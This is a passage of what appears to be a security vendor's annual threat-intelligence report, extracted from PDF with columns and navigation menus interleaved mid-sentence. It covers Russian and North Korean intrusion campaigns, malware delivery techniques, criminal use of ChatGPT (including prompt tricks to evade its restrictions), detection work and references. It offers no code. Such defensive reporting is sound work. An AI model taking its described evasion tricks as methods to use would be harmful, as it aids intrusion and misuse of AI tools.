continued use of offensive cyber capability. Ukrainian government 

entities were the targets of wiper attacks intended to disrupt critical 

services, a tactic which preceded the initial February 24 ground 

invasion and continued into 2023, although with less frequency 

and likely more limited success due in part to early detection 

and response. 

2023 State of the Threat: A Year in Review

58

 
01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Western Support for Ukraine's 
Defense Draws Russian Cyber 
Attention

CTU researchers analyzed email artifacts likely used in credential 

harvesting operations in August 2022 by IRON FRONTIER against 

staff at two U.S. national laboratories. The threat actors impersonated 

a fellow laboratory staff member in a multi\-day correspondence 

which attempted to establish rapport and deceive the victim into 

Organizations directly or indirectly involved in relief efforts intended 

visiting a mock login page which mimicked another well\-known 

for Ukraine but located outside of the immediate conflict zone 

laboratory.

nonetheless became a target for Russian cyberespionage campaigns. 

Targeted entities or those whose identities were hijacked and 

It is unknown whether the attack was successful in collecting any 

incorporated into social engineering aspects of cyber operations fell 

credentials or what the threat actor's final objective was, but it 

under the following sectors: 

resembled prior IRON FRONTIER operations which have led to 

credential disclosure and information theft reportedly reused in later 

• International logistics providers and weapons suppliers

information operations. 

• Refugee and human rights foundations

• Unmanned aerial systems (UAS) manufacturers 

• Scientific research institutions

Figure 29\. Threat actor provides technical support during exchange. 
(Source: Secureworks)

A similar deceptive spearphishing campaign in May 2023, likely by 

IRON RITUAL, impersonated the staff member of Poland's foreign 

embassy in Kyiv, using infrastructure and source material likely 

gained in a prior compromise. CTU analysis of the spearphishing 

email, which delivered a Microsoft Word attachment named “BMW 

5 for sale in Kyiv \- 2023\.docx” containing malicious links, revealed a 

globally diverse target set of organizations, including Secureworks 

NGO and IGO customers. However, all recipients were in some 

way government or non\-governmental entities aiding Ukraine. 

Attribution of the campaign to IRON RITUAL was based in part on an 

infection chain employed by the group in varying forms as early as 

2021, which involves the delivery of first\-stage malware through an 

HTML\-smuggling technique dubbed EnvyScout. EnvyScout acts as a 

dropper for additional malicious files, including Cobalt Strike or Brute 

Ratel implants, served from popular third\-party cloud services like 

DropBox, Google Drive, OneDrive, or Trello.

2023 State of the Threat: A Year in Review

59

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

The Blurred Lines Between 
Patriotic Hacktivism and Hostile 
State Cyber Operations

A leaked U.S. classified intelligence assessment and other threat 

intelligence suggest that some of the KillNet collective's members 

were communicating or coordinating with elements of Russian 

intelligence services about their activities. While CTU researchers 

have not had direct insight into these groups' intrusions, it is feasible 

The past year has seen a sharp increase in the amount of patriotic\-

that Russian government entities, directly or indirectly, play some 

minded Russian cyber groups seeking to harass organizations 

role in guiding the operations of these non\-state groups.

considered adversaries of Russia. The groups use social media, 

predominantly the Telegram messaging platform, to marshal 

brigades of followers, communicate targeting, and claim success 

for disruptive distributed denial of services attacks. CTU researchers 

tracked the KillNet collective and saw the group target a diverse 

range of organizations in countries across Europe, the Middle East, 

Forced to Evolve

and North America. 

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

KillNet and KillNet\-aligned groups like Anonymous Sudan reportedly 

did not use new or sophisticated methods in their attacks but 

likely caused at least some temporary disruption to hundreds of 

organizations across the following sectors since emerging at the 

start of 2022: 

• Banks 

• Airports and aviation 

07

Conclusion

• 

Information Technology (IT) providers 

08

Appendix

• Media 

• Law enforcement 

• Government portals

2023 State of the Threat: A Year in Review

60

01

Letter From Our VP

Third\-Party Cloud APIs—a 
Favored Place for Russian C2s 

would query open Telegram channels to retrieve the C2 address, 

which CTU researchers observed being updated multiple times daily. 

This method of providing C2 information can be an effective means 

of circumventing IP\-based filtering.

Executive Summary 

and Key Findings

While the malicious use of trusted third\-party cloud services is 

not unique to hostile state actors, Russian cyber groups frequently 

incorporate them in their operations. 

The Business of Cybercrime—

CTU researchers identified samples of an early\-stage downloader 

02

03

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

attributed to IRON RITUAL called GraphicalNeutrino that used 

the Notion cloud\-based notetaking and productivity platform for 

command and control (C2\) purposes. The samples were contained in 

a malicious ZIP archive downloaded from a compromised WordPress 

site via an EnvyScout HTML\-smuggling JavaScript. CTU analysis of 

the ZIP contents revealed that the loader performed queries to a 

Notion database via Notion's API service. The secret key embedded 

in the downloader and used to authenticate to the service had 

expired prior to the analysis but third\-party researchers determined 

that similar GraphicalNeutrino samples make the API calls to upload 

host information and download additional payloads. 

An April 2023 report61 by the Computer Emergency Response Team 

of Ukraine (CERT\-UA) observed an email campaign conducted by 

Russia's Foreign Intelligence Service against Ukraine that asked users 

to run a PowerShell script that collected host information and then 

uploaded it to the public Mocky API, a free service used by software 

developers to test apps. 

And the popular Telegram messaging service was used by IRON 

TILDEN as a dead\-drop resolver for communicating command 

and control server IP addresses. Hosts infected with IRON TILDEN 

stagers dubbed GammaLoad (CERT\-UA) or DinoTrain (Microsoft) 

2023 State of the Threat: A Year in Review

61

Finish MFA Enrollment or IRON 
RITUAL Will Do It for You 

Alongside spearphishing, Russian threat groups continued to 

conduct traditional password\-spraying attacks to gain unauthorized 

access to target environments. When weak credentials are found, 

multi\-factor authentication (MFA) will usually prevent the adversary 

from advancing. But in 2022, CTU researchers observed a Russian 

state\-sponsored threat group, likely IRON RITUAL, progressing 

beyond MFA defenses by further identifying weak accounts which 

were yet to enroll in MFA. The threat actors exploited this weakness 

to obtain full access to the victim's environment, logging into the 

external corporate VPN and using remote desktop services to 

navigate the internal network. The intrusion was detected, actor 

evicted, and stronger defenses built through the addition of multiple 

Azure Active Directory conditional access policies. 

Figure 30\. Azure AD cloud audit logs from account takeover. 
(Source: Secureworks) 

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

62

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

DEMOCRATIC PEOPLE'S 
REPUBLIC OF KOREA 
Revenue Remains the Major Focus

Main motivations: 

Financial Gain

Espionage

2023 State of the Threat: A Year in Review

63

 
 
01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

NORTH KOREA

North Korean threat groups primarily split into two types: those 

According to research carried out by blockchain analytics company 

that aim to gather outside geopolitical insight regarding countries 

Elliptic for Nikkei Asia63, North Korean threat groups have stolen $2\.3 

of interest, and others that focus on the need to sustain the North 

billion USD in crypto assets between 2017 and May 2023 (30 percent 

Korean economy and procure money for the isolated regime. 

of it from Japan alone). In comparison, their legitimate exports64 

Ultimately, the purpose of their activity is to inhibit any threats to 

totaled approximately $3\.6 billion over the same period (with 2017 

accounting for 58 percent of that figure), giving an insight into the 

value of these attacks to the North Korean economy. Nikkei Asia 

states that the U.N. Security Council estimates that North Korea 

stole between $600 million and $1 billion in cryptocurrency in 2022, 

double the previous year's total. Elliptic estimated the figure at $640 

million for 2022\.

the regime's security and stability. 

Cryptocurrency Theft

Since at least 2020, North Korea—officially known as the 

Democratic People's Republic of Korea (DPRK)—has devoted 

significant efforts to cryptocurrency theft, likely to compensate 

for the economic impact of UN sanctions that prevent the country 

from international trading. 

In the past year, North Korean threat actors have used AppleJeus 

malware to steal cryptocurrency. AppleJeus62 was first discovered 

07

Conclusion

in 2018 and has been a fundamental tool for North Korea's financial 

theft initiatives, masquerading as legitimate cryptocurrency 

trading applications. Public reports have linked these attacks on 

08

Appendix

the cryptocurrency industry to the Lazarus Group. CTU researchers 

broadly track Lazarus Group as NICKEL ACADEMY and consider 

NICKEL GLADSTONE to be a subgroup that focuses heavily on 

revenue generation for the North Korean regime. 

2023 State of the Threat: A Year in Review

64

01

Letter From Our VP

Multiple Operating Systems and a 
Plethora of File Types

including CHM70, OneNote, VHD, boot sector, and ISO. The 

deployment of various file types was likely due in some part to the 

change in the Windows default handling of VBA macros in July 2022, 

02

03

Executive Summary 

and Key Findings

North Korean threat groups have deployed macOS malware for 

many years. For example, NICKEL GLADSTONE has used one 

variant of AppleJeus malware dating back to 201865\. Since then, 

the use of malware built for platforms other than Windows has 

The Business of Cybercrime—

Is Boomtime Back?

steadily increased. North Korean threat groups now deploy several 

types of macOS\-based malware including AppleJeus, RustBucket66, 

CloudMensis67, and Manuscrypt68\. 

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

The macOS malware observed is often used in campaigns 

targeting blockchain technology, the cryptocurrency industry, and 

decentralized finance (DeFi) organizations. There is some evidence to 

suggest that the threat actors have adopted macOS tooling because 

the end users they target in these and associated sectors heavily use 

machines running macOS. 

Linux malware also features in at least one North Korean threat 

group's arsenal. In April 2023, public reporting revealed that a 

backdoor dubbed SimplexTea69 was linked to NICKEL ACADEMY. 

North Korean threat groups have been observed deploying Linux\-

based malware since at least 2017\. 

Throughout the past year, North Korean threat groups have also 

experimented with many different file types for malware delivery 

which we described earlier in the report.

Supply Chain Attacks

In April 2023, public reporting71 revealed that a North Korean threat 

group had orchestrated a cascading supply chain attack where one 

supply chain compromise at the Xtrader futures trading company 

enabled the threat actors to compromise a second supply chain at 

the 3CX communications software company. Both the Xtrader and 

3CX compromises were possibly carried out to generate revenue, 

but the 3CX compromise was potentially also for cyberespionage 

purposes. Multiple versions of a 3CX softphone application were 

trojanized with ICONIC infostealer malware.

Incident response efforts72 revealed that the initial supply chain 

attack occurred in early 2022; however, the second supply chain 

attack and subsequent campaign was not discovered until early 2023\. 

The string of supply chain attacks demonstrates the threat actors' 

persistence and willingness to devote preliminary resources with 

plans for long\-term results. In 2021, NICKEL ACADEMY conducted 

some preliminary supply chain attacks that may have led up to 

later efforts like the 3CX breach. The group compromised a South 

Korean think tank73 and a Latvian IT company74 to deliver a RAT and 

backdoor malware.

2023 State of the Threat: A Year in Review

65

01

Letter From Our VP

Executive Summary 

and Key Findings

02

03

06Threat Actor Use of 
Artificial Intelligence

The Business of Cybercrime—

Is Boomtime Back?

Secureworks' monitoring of criminal forums and marketplaces shows 

that criminal interest in ChatGPT and AI in general is on the rise, in 

line with increased interest in the topic across wider society.

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

66

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

Figure 31\. Underground forum posts reflecting an increased interest in AI and 
ML. (Source: Secureworks)

Despite an abundance of sensationalist headlines and hyperbole 

around ChatGPT and AI creating some kind of “super intelligent 

malware,” the reality does not yet match up. The most common 

use of ChatGPT we have seen is as lures in phishing emails or on 

malicious sites. These sites impersonate ChatGPT via typosquatting 

domains such as “chat\-gpt\-online\-pc.com” and “openai\-pc\-pro.

online,” with the aim of creating convincing home pages to prompt 

users into following malicious links or installing malicious browser 

07

Conclusion

extensions.

08

Appendix

Threat actors and researchers are experimenting with the creation 

of malware which leverages ChatGPT functionality for defense 

evasion and code creation. However, these types of AI models base 

their responses to user inputs on statistical analysis of previously 

produced text and do not currently demonstrate the creativity and 

ingenuity of human coders when finding novel ways to circumvent 

security controls and discover new vulnerabilities. 

In addition, some threat actors are advertising and selling access to 

AI\-based Telegram bots as a subscription service (see figure 30\). 

These bots allow users to request the creation of malicious scripts, 

craft phishing emails, or search for illicit goods on the dark web. 

The bot owners employ a pricing model that charges users by the 

interaction. For example, one seller offered 20 unrestricted initial 

queries but charged $5\.50 USD for every subsequent 100 queries. 

These Telegram bots may enable low\-skilled threat actors to use 

ChatGPT functionality, bypassing ethical restrictions. The threat 

actors could create low\-value untested malware that they may 

attempt to sell on underground forums, regardless of the quality and 

integrity of the code. This approach is unlikely to provide meaningful 

volume or competition for the plethora of existing malware available 

already from criminal developers, at least in the short term.

2023 State of the Threat: A Year in Review

67

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 33\. XSSBot is ready to answer questions. (Source: Secureworks)

Figure 32\. Example ChatGPT Telegram bot advertised on underground forum. 
(Source: Secureworks)

Threat actors often share research and ideas on underground 

forums, for example on how to use prompt engineering to 

circumvent restrictions regarding ChatGPT requests. CTU 

researchers have observed users seeking information about how 

The rate at which AI is developing could change this situation, with 

ChatGPT can improve their malicious code or streamline and 

one security researcher with minimal coding experience reportedly 

automate elements of their research and development. These 

generating in a matter of hours an infostealer that was not detected 

forums will likely be a fertile breeding ground for experimentation 

by any antivirus engines on VirusTotal75\. This capability is likely 

and sharing of ideas. 

already in the hands of larger teams of determined and experienced 

malware authors experimenting with how they can exploit these 

As of mid\-2023, despite these discussions and the obvious level 

capabilities. 

of interest displayed, phishing lures and Telegram bots remain the 

major implementations. However, this could change soon. Criminal 

Many criminal forums now have dedicated sub\-forums to discuss AI 

actors are also experimenting with other Large Language Models 

and machine learning. One forum (XSS) has created an AI Bot (called 

beyond ChatGPT in an attempt to provide features that will aid 

XSSBot) which will answer questions put to it by users of the forum.

criminal cyber activity, without the need to circumvent restrictions 

from commercial services.

2023 State of the Threat: A Year in Review

68

01

Letter From Our VP

07Conclusion

02

03

Executive Summary 

and Key Findings

One of the things that makes cybersecurity such a fascinating 

more frequently than newly discovered ones. This continues 

and challenging field is the need to combat and stay one step 

to demonstrate the value of focusing on the cybersecurity 

ahead of the continuing ingenuity of threat actors that this report 

fundamentals alongside staying current on the latest exploits and 

The Business of Cybercrime—

Is Boomtime Back?

demonstrates. Sometimes their innovations are driven by law 

TTPs. 

enforcement activity, such as taking down criminal marketplaces and 

forums, or by industry actions like Microsoft's disabling of macros 

The advice we regularly provide to customers is as relevant as ever: 

by default, or sometimes by political imperatives like China's desire 

Identify your assets and their location on your network, stay up to 

to frustrate detection of its cyberespionage activities. Often, they 

date with what is happening in the threat landscape, understand your 

are another step in the arms race between malicious actors and the 

risk profile and use it to prioritize your control framework and your 

efforts of companies like Secureworks to create the detections and 

approach to vulnerability management. Lockdown internet\-facing 

countermeasures that power systems like Taegis™ and protect our 

systems and sensitive internal systems using fully implemented best\-

customers. Some events, like Microsoft's decision to disable macros, 

practice MFA. Instrument your network to provide comprehensive 

force almost immediate change on the part of threat actors. Other 

monitoring of all endpoint, network, and cloud resources. We 

changes are more gradual.

understand that these recommendations, simple as they are to make, 

can sometimes be challenging to implement. However, working 

However, as fast as some threat actors are to innovate, many are 

closely with a trusted technology partner like Secureworks provides a 

happy to continue doing what still works. CISA's annual roundup 

significant step forward in ensuring that your security practice keeps 

of top routinely exploited vulnerabilities reinforces that point—

you safe.

in 202276, threat actors exploited older software vulnerabilities 

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

69

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

08Appendix

Taegis and the Secureworks View 
of the Threat

Secureworks' view of the threat landscape comes from a 

combination of telemetry from the Taegis™ XDR and VDR platforms, 

incident response and Secureworks Adversary Group customer 

Innovations in TTPs Occur 

engagements, and technical and tactical research conducted by the 

04

When Infection Chains Are 

Counter Threat Unit. These inputs combine to produce high\-fidelity 

This data combines to illustrate threat actor behavior, revealing both 

high\-level tactics and the technical details about their tooling. It 

feeds the threat intelligence products published every week by the 

CTU, and the unified “Rosetta Stone” that relates our threat groups to 

the naming conventions used by other TI providers. 

It also produces inputs for the repository of knowledge that drives 

the elite threat detection and integrated response actions that Taegis 

delivers. Other inputs include threat actor emulation and botnet 

Forced to Evolve

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

05

06

07

Conclusion

08

Appendix

visibility into threat actor intent, capability, and activity; and feed into 

actionable intelligence what organizations need to do to reduce their 

emulation.

risk.

• In the 12 months from July 2022, the Secureworks Incident 
Response team and Secureworks Counter Threat Unit 

conducted 1,300\+ incident response engagements, across 

a wide spectrum of industry sectors.

• Secureworks processes over 1\.8 trillion event logs a 

week, or around 610 billion logs every single working day, 

gathered from security infrastructure in thousands of 

customer environments around the world.

• CTU researchers gather and analyze data from internally 

generated and externally collected telemetry, from multiple 

sources including publicly available information, dark 

web forums, proprietary botnet emulation systems, and 

intelligence relationships.

1,300\+

IR Engagements

1\.8 Trillion\+

Event Logs a Week

100\+ CTU Researchers Gather Data from:

 Internally Generated/
Externally Collected 
Telemetry

Publicly 
Available 
Information

Intelligence 
Relationships

2023 State of the Threat: A Year in Review

70

01

Letter From Our VP

Threat Actor Emulation—Feeding 
the Virtuous Circle Within Taegis

before they can cause significant harm to customers. This allows 

us to adopt a strategic defensive stance, better safeguarding the 

privacy and security of our clients and partners. 

Executive Summary 

and Key Findings

Emulating offensive tools and techniques within a secure and 

controlled environment allows CTU researchers to immerse 

The result is a more resilient cybersecurity infrastructure that 

safeguards our customers' and partners' critical assets and data and 

themselves in the mindset of threat actors, creating valuable insights 

feeds back into our threat intelligence.

into their methodologies and strategies.

02

03

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

Taegis™ is at the core of this endeavor, tracking and monitoring 

activity on our test systems throughout the emulated attacks. The 

platform captures system telemetry and performs near\-real\-time 

analysis of the data. As we closely monitor these emulated attacks, 

we make context\-aware adjustments to our defense strategies, 

fortifying potential weak points identified during testing. This 

adaptive approach helps us to keep up with changes in the threat 

landscape and proactively strengthens the platform's capabilities.

The Value of Botnet Emulation

The CTU botnet emulator system allows our researchers 

to maintain real\-time situational awareness of 

cybercriminal threats through perpetual automated 

engagement with threat actor infrastructure.

Direct participation in a botnet provides an opportunity for 

near\-immediate discovery of new infrastructure, protocol 

Threat emulation also provides additional experience in countering 

changes, and delivered commands and payloads as well 

a wide array of cyber threats, and helps refine real\-time threat 

as monitoring the botnet's availability. These interactions 

detection, defensive measures, incident response, and vulnerability 

are not dictated by a malware's normal execution control 

mitigation. 

It also fosters a culture of continuous improvement within our 

team. Regular debriefings and comprehensive post\-mortem 

analyses after each emulation provide the opportunity to identify 

and address shortcomings or potential blind spots in our defense 

flow and instead allow for systematic interrogation that 

can extract more information from C2 servers than under 

normal circumstances. 

Direct communication with attacker infrastructure also 

allows us to publish indicators at high confidence levels. 

Previously this type of information had to be gathered 

passively through client telemetry or observation of 

improvements to the platform, ensuring that our defense strategies 

sandbox detonations which provide an incomplete picture.

evolve alongside the ever\-changing threat landscape.

By maintaining a proactive approach to understanding offensive 

tools and techniques, we are better equipped to anticipate threats 

2023 State of the Threat: A Year in Review

71

08

Appendix

mechanisms. The lessons learned are then incorporated into ongoing 

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

The Taegis Intelligence to 
Protection Pipeline in Action

An open\-source report77 about the Guildma/Astaroth stealer led 

one of our researchers to request countermeasure creation, leading 

to the detection of similar activity in customer environments. The 

report detailed how Astaroth was observed abusing the colorcpl.

exe LOLBIN to copy bitsadmin.exe into a non\-standard directory 'c:\\

windows\\system32\\spool\\drivers\\color\\. This was likely to bypass 

security controls that detect the abuse of bitsadmin.exe executed on 

its original folder.

Reviewing our telemetry revealed events showing Astaroth activity 

in a customer environment, and a high severity alert generated for 

the client for an AppLocker Bypass Process run from \\System32\\

spool\\drivers\\color. Because there was no alert for the copying of 

bitsadmin.exe into the non\-standard directory, our researcher raised 

a countermeasure request to identify future occurrences of this 

malicious activity.

The resulting countermeasure alerted on similar malicious process 

executions in another customer's environment. Secureworks 

escalated the incident to the customer via a high\-severity 

investigation and incident response was invoked.

Figure 34\. Bitsadmin.exe events in a customer environment. 
(Source: Secureworks.)

2023 State of the Threat: A Year in Review

72

1 

2 

3 

4 

5 

6 

7 

8 

9 

10 

11 

12 

13 

2022 State of the Threat: A Year in Review, 
https://www.secureworks.com/resources/rp\-state\-of\-the\-
threat\-2022, 9/22\.

Secureworks threat profiles, 
https://www.secureworks.com/research/threat\-profiles

MalasLocker ransomware targets Zimbra servers, 
demands charity donation, https://www.bleepingcomputer.
com/news/security/malaslocker\-ransomware\-targets\-
zimbra\-servers\-demands\-charity\-donation/, 5/17/23\.

Ransomware Revenue Down As More Victims Refuse 
to Pay, https://blog.chainalysis.com/reports/crypto\-
ransomware\-revenue\-down\-as\-victims\-refuse\-to\-pay/, 
1/19/23\.

Infostealer Market Booming, Despite Genesis Market and 
RaidForums Takedowns, https://www.secureworks.com/
about/press/infostealer\-market\-booming\-despite\-genesis\-
market\-and\-raidforums\-takedowns, 5/16/23\.

BRONZE STARLIGHT RANSOMWARE OPERATIONS USE 
HUI LOADER, https://www.secureworks.com/research/
bronze\-starlight\-ransomware\-operations\-use\-hui\-loader, 
6/23/22\.

CISA, NSA, FBI, and International Partners Release Joint 
CSA on Top Routinely Exploited Vulnerabilities of 2022, 
https://www.cisa.gov/news\-events/alerts/2023/08/03/cisa\-
nsa\-fbi\-and\-international\-partners\-release\-joint\-csa\-top\-
routinely\-exploited\-vulnerabilities, 8/3/23\.

BA, BBC and Boots hit by cyber security breach with 
contact and bank details exposed, https://news.sky.
com/story/bas\-uk\-staff\-exposed\-to\-global\-data\-theft\-
spree\-12896900, 6/5/23\.

Reward Offers for Information to Bring Conti 
Ransomware Variant Co\-Conspirators to Justice, https://
www.state.gov/reward\-offers\-for\-information\-to\-bring\-
conti\-ransomware\-variant\-co\-conspirators\-to\-justice/, 
5/6/23\.

Ransomware Revenue Down As More Victims Refuse 
to Pay, https://blog.chainalysis.com/reports/crypto\-
ransomware\-revenue\-down\-as\-victims\-refuse\-to\-pay/, 
1/19/23\.

ITG23 Crypters Highlight Cooperation Between 
Cybercriminal Groups, https://securityintelligence.com/
posts/itg23\-crypters\-cooperation\-between\-cybercriminal\-
groups/, 5/19/23\. 

Recovery of Colonial Pipeline ransom funds highlights 
traceability of cryptocurrency, experts say, https://www.
thomsonreuters.com/en\-us/posts/investigation\-fraud\-and\-
risk/colonial\-pipeline\-ransom\-funds/, 6/23/21\.

Ransomware criminals sanctioned in joint UK/US 
crackdown on international cyber crime, https://www.
nationalcrimeagency.gov.uk/news/ransomware\-criminals\-
sanctioned\-in\-joint\-uk\-us\-crackdown\-on\-international\-
cyber\-crime, 2/9/23\.

14 

15 

16 

17 

18 

19 

20 

21 

22 

23 

24 

25 

26 

27 

U.S. Department of Justice Disrupts Hive Ransomware 
Variant, https://www.justice.gov/opa/pr/us\-department\-
justice\-disrupts\-hive\-ransomware\-variant, 1/26/23\.

Exclusive: US government agencies hit in global 
cyberattack, https://edition.cnn.com/2023/06/15/politics/
us\-government\-hit\-cybeattack/index.html, 6/15/23\.

Royal Mail cyberattack linked to LockBit ransomware 
operation, https://www.bleepingcomputer.com/news/
security/royal\-mail\-cyberattack\-linked\-to\-lockbit\-
ransomware\-operation/, 1/12/23\. 

Authorities Warn Health Sector of Attacks by Rhysida 
Group, https://www.bankinfosecurity.com/authorities\-
warn\-health\-sector\-attacks\-by\-rhysida\-group\-a\-22753, 
8/7/23\.

Babuk Source Code Sparks 9 Different Ransomware 
Strains Targeting VMware ESXi Systems, https://
thehackernews.com/2023/05/babuk\-source\-code\-sparks\-
9\-new.html, 5/11/23\. 

Massive ESXiArgs ransomware attack targets VMware 
ESXi servers worldwide, https://www.bleepingcomputer.
com/news/security/massive\-esxiargs\-ransomware\-attack\-
targets\-vmware\-esxi\-servers\-worldwide/, 2/3/23\.

Critical Infrastructure Sectors, https://www.cisa.gov/
topics/critical\-infrastructure\-security\-and\-resilience/
critical\-infrastructure\-sectors, accessed 8/18/23\. 

What effects have sanctions had on the Russian 
economy? https://www.weforum.org/agenda/2022/12/
sanctions\-russian\-economy\-effects/, 12/22/22\.

United States v. Conor Brian Fitzpatrick, https://www.
justice.gov/usao\-edva/united\-states\-v\-conor\-brian\-
fitzpatrick, Updated 6/20/23\.

BreachForums owner Pompompurin pleads guilty to 
hacking charges, https://www.bleepingcomputer.com/
news/security/breachforums\-owner\-pompompurin\-pleads\-
guilty\-to\-hacking\-charges/, 7/14/23\.

U.S. Department of Justice Disrupts Hive Ransomware 
Variant, https://www.justice.gov/opa/pr/us\-department\-
justice\-disrupts\-hive\-ransomware\-variant, 1/26/23\.

Cuba ransomware believed to be Russian state\-backed 
operation, https://www.scmagazine.com/brief/threat\-
intelligence/cuba\-ransomware\-believed\-to\-be\-russian\-
state\-backed\-operation, 5/17/23\.

RomCom malware spread via Google Ads for ChatGPT, 
GIMP, more, https://www.bleepingcomputer.com/news/
security/romcom\-malware\-spread\-via\-google\-ads\-for\-
chatgpt\-gimp\-more/, 5/30/23\.

Cyber attack on state organizations of Ukraine using 
RomCom malware. Possible involvement of Cuba 
Ransomware aka Tropical Scorpius aka UNC2596 (CERT\-
UA\#5509\), https://cert.gov.ua/article/2394117, 10/22/22\.

28 

29 

30 

31 

32 

33 

34 

35 

36 

37 

38 

39 

Hello Ransomware Uses Updated China Chopper Web 
Shell, SharePoint Vulnerability, https://www.trendmicro.
com/en\_us/research/21/d/hello\-ransomware\-uses\-
updated\-china\-chopper\-web\-shell\-sharepoint\-vulnerability.
html, 4/27/21\.

Seven International Cyber Defendants, Including “Apt41” 
Actors, Charged In Connection With Computer Intrusion 
Campaigns Against More Than 100 Victims Globally, 
https://www.justice.gov/opa/pr/seven\-international\-cyber\-
defendants\-including\-apt41\-actors\-charged\-connection\-
computer, 9/16/20\.

OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT 
ACTORS, https://www.secureworks.com/blog/opsec\-
mistakes\-reveal\-cobalt\-mirage\-threat\-actors, 9/14/22\.

Three Iranian Nationals Charged with Engaging in 
Computer Intrusions and Ransomware\-Style Extortion 
Against U.S. Critical Infrastructure Providers, https://
www.justice.gov/opa/pr/three\-iranian\-nationals\-charged\-
engaging\-computer\-intrusions\-and\-ransomware\-style\-
extortion, 9/14/22\.

Treasury Sanctions IRGC\-Affiliated Cyber Actors for 
Roles in Ransomware Activity, https://home.treasury.gov/
news/press\-releases/jy0948, 9/14/22\.

Internet Crime Report 2022, https://www.ic3\.gov/Media/
PDF/AnnualReport/2022\_IC3Report.pdf, 3/13/23\.

Macros from the internet will be blocked by default in 
Office, https://learn.microsoft.com/en\-us/deployoffice/
security/internet\-macros\-blocked, 2/28/23\.

DARKTORTILLA MALWARE ANALYSIS, https://www.
secureworks.com/research/darktortilla\-malware\-analysis, 
8/17/22\.

Qakbot Malware Disrupted in International Cyber 
Takedown, https://www.justice.gov/usao\-cdca/pr/qakbot\-
malware\-disrupted\-international\-cyber\-takedown, 8/29/23\.

Gootloader malware updated with PowerShell, sneaky 
JavaScript, https://www.theregister.com/2023/01/30/
gootloader\_mandiant\_malware/, 1/30/23\.

Healthcare Sector Warned About Increase in GootLoader 
Malware Infections, https://www.hipaajournal.com/
healthcare\-sector\-warned\-about\-increase\-in\-gootloader\-
malware\-infections/, 2/15/23\.

Use Microsoft Purview Audit (Premium) to investigate 
compromised accounts, https://learn.microsoft.com/
en\-us/purview/audit\-log\-investigate\-accounts?view\=o365\-
worldwide, 7/21/23\.

40 

Obfuscated Files or Information: HTML Smuggling, 
https://attack.mitre.org/techniques/T1027/006/, accessed 
8/18/23\.

41 

The Abraham Accords, https://www.state.gov/the\-
abraham\-accords/, 9/15/20\.

2023 State of the Threat: A Year in Review

73

71 

72 

73 

74 

75 

76 

Supply\-chain attack on 3CX clients, https://www.
kaspersky.com/blog/supply\-chain\-attack\-on\-3cx/47698/, 
3/30/23\.

3CX Software Supply Chain Compromise Initiated by a 
Prior Software Supply Chain Compromise; Suspected 
North Korean Actor Responsible, https://www.mandiant.
com/resources/blog/3cx\-software\-supply\-chain\-
compromise, 4/27/23\.

North Korean Lazarus Hacking Group Leverages Supply 
Chain Attacks To Distribute Malware for Cyber Espionage, 
https://www.cpomagazine.com/cyber\-security/north\-
korean\-lazarus\-hacking\-group\-leverages\-supply\-chain\-
attacks\-to\-distribute\-malware\-for\-cyber\-espionage/, 
11/5/21\.

North Korea's Lazarus Group Turns to Supply Chain 
Attacks, https://www.darkreading.com/threat\-intelligence/
